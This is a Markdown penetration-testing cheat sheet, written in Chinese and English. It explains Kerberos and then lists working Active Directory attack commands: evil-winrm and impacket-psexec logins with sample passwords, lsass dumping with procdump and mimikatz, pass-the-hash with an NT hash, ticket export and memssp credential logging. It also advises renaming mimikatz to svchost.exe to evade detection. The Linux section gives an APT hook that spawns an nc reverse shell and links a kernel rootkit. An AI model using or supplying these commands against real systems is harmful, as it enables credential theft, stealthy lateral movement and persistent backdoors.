## Windows

### AD

#### Kerberos
Kerberos 是一個 **authentication protocol**

- Kerberos authentication process
  - UDP/88 and TCP/88, which should be listen in KDC
    - KDC (Key Distribution Center)
      - responsible of issuing the tickets
      - installed on the DC (Domain Controller)
      - supported by the AS (Authentication Service), which issues the TGTs
- 2 types tickets
  - TGS (Ticket Granting Service)：確定使用者可以 authenticate against a service
  - TGT (Ticket Granting Ticket)：代表可以 TGS 做請求
  - PAC (Privilege Attribute Certificate)：structure included in almost **every ticket**
    - contains the **privileges** of the user and it is signed with the KDC key

Kerberos Message

- KRB_AS_REQ: Used to request the TGT to KDC
  - 跟 KDC 要求 TGT
- KRB_AS_REP: Used to deliver the TGT by KDC.
  - 確定資料正確後會回傳 encrypted data (by user key)，其中就包含了 session key
    - 至此可以拿 TGT 跟 TGS 做請求
- KRB_TGS_REQ: Used to request the TGS to KDC, using the TGT.
- KRB_TGS_REP: Used to deliver the TGS by KDC.
  - 結束後 user 就有 valid TGS 可以**跟服務做請求**，之後就向 AP 發送 **KRB_AP_REQ** message
- KRB_AP_REQ: Used to authenticate a user against a service, using the TGS.
- KRB_AP_REP: (Optional) Used by service to identify itself against the user.
- KRB_ERROR: Message to comunicate error conditions.



#### winrm

**攻擊細節(Script/指令)**

```bash
evil-winrm -i <ip> -u evenet -p jonathan
```



#### PsExec

**說明**

- domain admin 利⽤ `smb` 服務登⼊並提權⾄ `nt authority\system`
- 必須要是 domain admin

**payload**

```bash
impacket-psexec "Billy:\$bilib1l1@<ip>"
impacket-psexec Artis:"ABC24106!"@<ip>
sh -c 'impacket-psexec "Artis:ABC24106!@<ip>"'
```



#### pass-the-hash

**說明**

- 先預備好 `mimikatz.exe `以及 `procdump.exe`
- `mimikatz.exe` 改名為 `svchost.exe` 或 `dllhost.exe`，以免被發現

**payload**

```bash
# dump lsass.exe memory
procdump64.exe -accepteula -ma lsass.exe lsass.dmp

## use pypykatz in linux
pypykatz lsa minidump -o creds.txt lsass.dmp

## or use mimikatz in windows
mimikatz.exe "privilege::Debug" "sekurlsa::logonPasswords"

# use in remote
## -hashes - LM:NT
## empty LM: aad3b435b51404eeaad3b435b51404ee
## Administator NT: 2ea83ab1dc69bfbebd27198885051b93
impacket-psexec -hashes
aad3b435b51404eeaad3b435b51404ee:2ea83ab1dc69bfbebd27198885051b93
Administrator@<ip>
```





#### pass-the-ticket

**payload**

```powershell
mimikatz.exe "privilege::Debug" "sekurlsa::tickets /export"
```



#### memssp

**payload**

```powershell
mimikatz.exe "privilege::debug" "misc::memssp"
# result in C:\\Windows\System32\mimilsa.log
```





##### 參考資料

- https://book.hacktricks.xyz/windows/active-directory-methodology 



## Linux

透過 apt hook 的 prefix，可以定義在做 apt 相關操作之前/之後會執⾏哪些命令:

- `Dpkg::Pre-Invoke {  }`
- `Dpkg::Post-Invoke {  }`
- `APT::Update::Pre-Invoke {  }`
- `APT::Update::Post-Invoke {  }`
- e.g. `apt::Update::Pre-Invoke {"rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc > /tmp/f ＆"};'`

kernel module 後門

- [Reptile](https://github.com/f0rb1dd3n/Reptile)
